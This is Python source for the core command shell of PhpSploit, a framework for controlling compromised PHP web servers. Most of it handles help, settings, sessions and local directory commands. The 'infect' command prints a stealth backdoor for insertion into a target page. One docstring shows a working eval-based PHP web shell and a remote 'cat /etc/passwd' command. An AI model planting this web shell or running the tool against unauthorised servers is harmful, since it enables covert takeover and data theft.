import os

from functions import *
from interface.func import *

from interface import cmdlib

class CoreShell(cmdlib.Cmd):
    """PhpSploit Core Interface:
    This class provides the low level phpsploit interface. It is loaded
    by both shell interfaces, and contains the Core Shell Commands.
    It inherits form the cmdlib.

    """
    shell_name = 'core'

    def __init__(self):
        """Explicitly load the cmdlib's __init__ method

        """
        cmdlib.Cmd.__init__(self)

        # these list() vars can be used to disable write access
        # on specific settings and environment variables.
        self.locked_settings = []
        self.locked_env      = []


    def get_commands(self, obj=None):
        """Return a list of the specified interface object.
        Calling it without arguments gives the list of every currently
        available commands, including core and shell commands, and also
        phpsploit plugins and aliases.

        """
        commands = list()

        if obj is None:
            # NoneType objects must add plugins to the list if available
            try:
                commands = self.plugins.commands()
            except:
                pass
            # then simply use the current class as target object
            obj = self

        # add every method starting with "do_" to the commands list
        for method in dir(obj):
            if method.startswith('do_'):
                commands.append(method[3:])

        # then sort it and return
        commands = list( set(commands) )
        commands.sort()

        return(commands)


    #####################
    ### COMMAND: exit ###
    def do_exit(self, argv):
        """Leave the current shell interface

        SYNOPSIS:
            exit

        DESCRIPTION:
            - Executed from the main shell interface, this command
            leaves the PhpSploit framework.
            - Calling it from a remote shell session simply leaves it,
            backing to the main shell interface
        """
        return(True)


    ######################
    ### COMMAND: clear ###
    def do_clear(self, argv):
        """Clear the terminal screen

        SYNOPSIS:
            clear

        DESCRIPTION:
            Clear the current visible terminal data, leaving blank the
            screen. Used for visibility purposes.
        """
        cmd = ['clear','cls'][os.name == 'nt']
        os.system(cmd)


    #####################
    ### COMMAND: rtfm ###
    def do_rtfm(self, argv):
        """Read the fine manual

        SYNOPSIS:
            rtfm

        DESCRIPTION:
            Display the PhpSploit's user manual using the "man" command,
            or simply write to standard output it's ascii version on
            OSes which do not provide manpage system.
        """
        def _printit():
            print( getpath('README').read() )

        if os.name == 'nt':
            _printit()
        else:
            cmd = 'man ' + getpath('framework/misc/manual-page.1').name
            if os.system(cmd) != 0:
                _printit()


    #######################
    ### COMMAND: infect ###
    def do_infect(self, argv):
        """Print the injectable payload

        SYNOPSIS:
            infect

        DESCRIPTION:
            The "infect" commands outputs the formated PHP data which
            must be used to stealthy estabilish an HTTP connection
            between the framework and the targeted server.

            NOTE: The backdoor is generated dependending on the PASSKEY
            setting, which also acts as a password, preventing other
            PhpSploit users to be able to use your backdoor. For this
            reason, changing it's setting to your custom value is
            recommended.
        """
        backdoor = self.CNF['LNK']['BACKDOOR']
        separator = P_NL + ('=' * len(backdoor)) + P_NL

        print(P_NL + P_inf+"The following payload must"
              " be inserted in the target web page.")

        print(P_inf+"Then adjust the TARGET setting to"
              " it in order to start the remote shell")

        print(separator + color(34) + backdoor + color(0) + separator)


    #####################
    ### COMMAND: save ###
    def do_save(self, argv):
        """Save the current session in a file

        SYNOPSIS:
            save [<LOCAL FILE>|<LOCAL DIRECTORY>]

        DESCRIPTION:
            Dump the current framework session, (aka environment,
            settings and remote server objects) to the file path
            specified as argument.
            - Giving an absolute file path as argument simply writes the
            session to it, while giving a directory path defaulty
            assumes "phpsploit.session" as file name.
            - Giving a single file name without path will write it in the
            directory specified by the SAVEPATH setting.

        EXAMPLES:
            > save
              - Write the session to ${SAVEPATH}/phpsploit.session
            > save target.com.sess
              - Write the session to ${SAVEPATH}/target.com.sess
            > save ./target.com.sess
              - Write the session as "target.com.sess" in current dir
            > save /pentest/audits/target.com/
              - Write the session as "phpsploit.session" in given dir
        """
        # assume empty string as default argument
        argv.append('')

        # then just let the usr.session.save() function do the job
        from usr.session import save
        savedFile = save(self.CNF, argv[1])
        if savedFile:
            self.CNF['SET']['SAVEFILE'] = savedFile


    #####################
    ### COMMAND: lpwd ###
    def do_lpwd(self, argv):
        """Print local working directory

        SYNOPSIS:
            lpwd

        DESCRIPTION:
            This command print the local working directory from your own
            local system, exactly like does the "pwd" shell command on
            unix systems.
        """
        print( os.getcwd() )


    ####################
    ### COMMAND: lcd ###
    def do_lcd(self, argv):
        """Change local working directory

        SYNOPSIS:
            lcd <LOCAL DIRECTORY>

        DESCRIPTION:
            The "lcd" command is an equivalent of the "cd" unix
            command. It must be used to change the current working
            directory of your local system.

            NOTE: This command should not be confused with the
            PhpSploit's "cd" command, which is a plugins doing the same
            on the remotely exploited system.

        EXAMPLES:
            > lcd ~
            > lcd /tmp
        """
        # only one argument must be supplied
        if len(argv) != 2:
            return( self.run('help lcd') )

        # expand user special path notation "~"
        newDir = os.path.expanduser( argv[1] )
        try:
            os.chdir(newDir)
        except OSError as e:
            error = str(e)[str(e).find(']')+2:]
            print( P_err + error )


    #######################
    #### COMMAND: debug ###
    def do_debug(self, argv):
        """Trivial debugging command

        SYNPOPSIS:
            debug

        DESCRIPTION:
            Designed for debugging purposes, it is very trivial for the
            moment and simply dumps the current session and core content
            as a visible indentend dict() python object.

            NOTE: This command can be helpful for developpers, and
            future debugging options must be included into it.
        """
        from pprint import pprint
        pprint(self.CNF)


    ####################
    ### COMMAND: eval ##
    def do_eval(self, argv):
        """Execute the given commands list

        SYNOPSIS:
            eval <LOCAL FILE>|<COMMAND> ...

        DESCRIPTION:
            This command can take as many arguments as necessary.
            Each specified argument will be executed as if the
            concerned string had been typed by the user in the
            framework interface.
            The behavior specified above shall not apply in cases where
            the supplied argument is a valid file path, in which case
            the file's content will be evaluated instead, line by line
            as a list of PhpSploit commands.

        EXAMPLES:
            > eval clear "help clear"
              - Run "clear", then "help clear"
            > eval "clear; lcd '/tmp'; lpwd"
              - Run the given enquoted argument as a command list
            > eval /tmp/spl01t-script.phpsploit
              - Run the given script file's content, line by line
        """

        # at least one argument must be given
        if len(argv) < 2:
            return( self.run('help eval') )

        # treat each given argument
        for i in range(1, len(argv)):
            # check if it is a file path
            f = getpath(argv[i])
            if f.isfile():
                # then assume it's content as data instead of argument string
                try:
                    argv[i] = f.read()
                except EnvironmentError, e:
                    print( P_err + "Eval error: '%s': %s" %(e.filename,
                                                            e.strerror) )
                    return(None)
                except BaseException, e:
                    print( P_err + "Eval error: %r" %(e) )
                    return(None)

        # eval all resulting data
        data = '\n'.join( argv[1:] )
        return( self.run(data) )


    ####################
    ### COMMAND: set ###
    def complete_set(self, text, *ignored):
        """use the settings list as "set" argument completion array"""
        text = text.upper()
        completions = list()
        for key in self.CNF['SET'].keys():
            if key.startswith(text):
                completions.append(key+' ')
        return(completions)

    def do_set(self, argv):
        """View and edit settings

        SYNOPSIS:
            set [<NAME> ["<VALUE>"]]

        DESCRIPTION:
            The PhpSploit settings are declared at start by their
            default values. The user configuration overwrite them for
            customisation purposes.
            The 'set' command handles settings from the framework
            interface.
            - Called with no argument, the whole settings list will be
              displayed.
            - A single argument displays the list of settings whose
              name start with it.
            - Two arguments are used to change the value of a setting,
              considering the first one as the setting to be changed;
              and the second as the new setting value.

            NOTE: The 'set' operating scope is limited to the current
            PhpSploit session. It means that persistant settings value
            changes must be defined by the hand in the user
            configuration file.


        WARNING:
            Considering the PhpSploit's input parser, commands which
            contain quotes, semicolons, and other chars that could be
            interpreted by the framework MUST be enquoted to be
            interpreted as a single argument. For example:
              > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
            In this case, quotes and semicolons will be interpreted by
            the framwework, so the correct syntax is:
              > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

        EXAMPLES:
            > set REQ_
              - Display all settings whose name begins with "REQ_"
            > set TEXTEDITOR
              - Show the current value of the TEXTEDITOR setting
            > set TEXTEDITOR /usr/bin/vim
              - Set "/usr/bin/vim" as TEXTEDITOR value (<3 vim)
            > set BACKDOOR "<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>"
              - Set BACKDOOR's new value, in this case, the string
                to use as value contained quotes and semicolons,
                which are interpreted by the interface, like in bash.
                For that reason the value MUST BE correctly enquoted.
        """
        def set_var(var, val):
            """(try to) change the value to "val" of the "var" setting"""
            # use backup and set new value
            backup = self.CNF['SET'][var]
            self.CNF['SET'][var] = val
            from usr.settings import comply

            # if the new value is syntaxically accepted by settings lib:
            if comply(self.CNF['SET']):

                # the LNK object must be backed up and updated before
                # possible on the fly TARGET url modification.
                lnk_backup = self.CNF['LNK']
                self.CNF['LNK'] = update_opener(self.CNF)

                # Changing TARGET on the fly, during a remote shell session
                # implies that a payload link must be estabilished with the
                # new value, and the new TARGET signature compared to the old.
                if var == 'TARGET' and self.shell_name == 'remote':
                    import network.server
                    if network.server.Link(self.CNF).check():
                        self.CNF['LNK_HASH'] = self.CNF['LNK']['HASH']
                        self.set_prompt()
                    else:
                        self.CNF['LNK'] = lnk_backup
                        self.CNF['SET'][var] = backup

                # on normal scenarios, just display the new value,
                # which indicates a successfull operation.
                else:
                    showVal = color(1) + self.CNF['SET'][var] + color(0)
                    print( var + " ==> " + showVal )

            # incorrect syntax juste resets the value to backup
            else:
                self.CNF['SET'][var] = backup

        # Display settings list
        if len(argv) <= 2:
            # list settings matching argv[1]
            patern = argv[1].upper() if len(argv) > 1 else ''
            title = "Session settings"
            items = self.CNF['SET'].items()
            elems = [(x.upper(),y) for x,y in items if x.startswith(patern)]
            # an empty array implies that the given argument was
            # wrong, then display the help message instead
            if elems:
                columnize_vars(title, dict(elems)).write()
            else:
                self.run('help set')

        # Change the specified setting
        else:
            setting = argv[1].upper()
            if setting in self.CNF['SET']:
                if setting in self.locked_settings:
                    print( P_err+'Locked session setting: '+setting )
                else:
                    value = ' '.join( argv[2:] ).strip()
                    set_var(setting, value)
            else:
                self.run('help set')



    #####################
    ### COMMAND: help ###
    def do_help(self, argv):
        """Show commands help

        SYNOPSIS:
            help [<COMMAND>]

        DESCRIPTION:
            It displays help message for any command, including
            plugins.
            - Without arguments, the whole available commands, sorted
              by category, are displayed including a summary line for
              each one.
            - To display the full help message of a specific command,
              it must be given as argument.

            NOTE: A plugin command may also be called with "--help"
            a argument, resulting to the same as "help <plugin>".

        EXAMPLES:
            > help
              - Displpay the full help, sorted by category
            > help clear
              - Display the help for the "clear" command
        """
        # If more than 1 argument, help to help !
        if len(argv) > 2:
            return( self.run('help help') )

        # collect the command list from current shell
        sys_commands = self.get_commands(self)

        def get_doc(cmdName):
            """return the docstring lines list of specific command"""
            # try to get the doc from the plugin method
            try:
                docString = self.plugins.get(cmdName, 'help')
            except:
                docString = None
            # or try to get it from the shell commands
            if cmdName in sys_commands:
                docString = getattr(self, 'do_'+cmdName).__doc__
            # else try to get it from the core commands
            if docString is None:
                try:
                    docString = getattr(CoreShell, 'do_'+cmdName).__doc__
                except:
                    docString = None
            # a list, even empty must be returned in any case
            if docString is None:
                return( list() )
            return( docString.strip().splitlines() )

        def get_description(docLines):
            """return the command description (1st docstring line)"""
            try:
                return( docLines[0].strip() )
            except:
                return( color(33) + 'No description' + color(0) )

        def doc_help(docLines):
            """print the formated command's docstring"""
            # reject empty docstrings (description + empty line)
            if len(docLines) < 2:
                return(None)
            docLines.pop(0) # remove the description line
            while not docLines[0].strip():
                docLines.pop(0) # remove heading empty lines

            # remove junk leading spaces (due to python indentation)
            trash = len( docLines[0] ) - len( docLines[0].lstrip() )
            docLines = [ line[trash:].rstrip() for line in docLines ]

            # hilight lines with no leading spaces (man style)
            result = str()
            for line in docLines:
                if line == line.lstrip():
                    line = color(1) + line + color(0)
                result += line + P_NL

            print(result)

        # get full help on a single command
        if len(argv) == 2:
            doc = get_doc(argv[1])
            # if the given argument if not a command, return nohelp err
            if not doc:
                print( self.nohelp %raw_repr(argv[1]) )
                return(None)

            # print the heading help line, which contain description
            print( P_NL + P_inf + argv[1] + ": " +
                   get_description(doc) + P_NL )

            # call the help_<command> method, otherwise, print it's docstring
            try:
                getattr( self, 'help_'+argv[1] )()
            except:
                doc_help(doc)
            return(None)

        # display the whole list of commands, with their description line

        # set maxLength to the longest command name, and at least 13
        maxLength = max( 13, len(max(sys_commands, key=len)) )

        # split sys_commands into shell and core command categories
        core_commands  = self.get_commands(CoreShell)
        shell_commands = [x for x in sys_commands if x not in core_commands]
        help = [('Core Commands', core_commands),
                ('Shell Commands', shell_commands)]

        # adds plugin category if we are in the remote shell
        if self.shell_name == 'remote':
            for category in self.plugins.categories():
                name = category.replace('_', ' ').capitalize()
                items = self.plugins.list_category(category)

                # rescale maxLength in case of longer plugin names
                maxLength = max( maxLength, len(max(items, key=len)) )
                help += [ (name+' Plugins', items) ]

        # print commands help, sorted by groups
        cmdColumn = ' ' * (maxLength-5)
        for groupName, groupCommands in help:

            # display group (category) header block
            underLine = '=' * len(groupName)
            print( P_NL + groupName +  P_NL + underLine      + P_NL +
                   '    Command' + cmdColumn + 'Description' + P_NL +
                   '    -------' + cmdColumn + '-----------' + P_NL )

            # display formated command/description pairs
            groupCommands.sort()
            for cmdName in groupCommands:
                spaceFill = ' ' * ( maxLength - len(cmdName) +2 )
                description = get_description( get_doc(cmdName) )
                print( '    ' + cmdName + spaceFill + description )
            print('')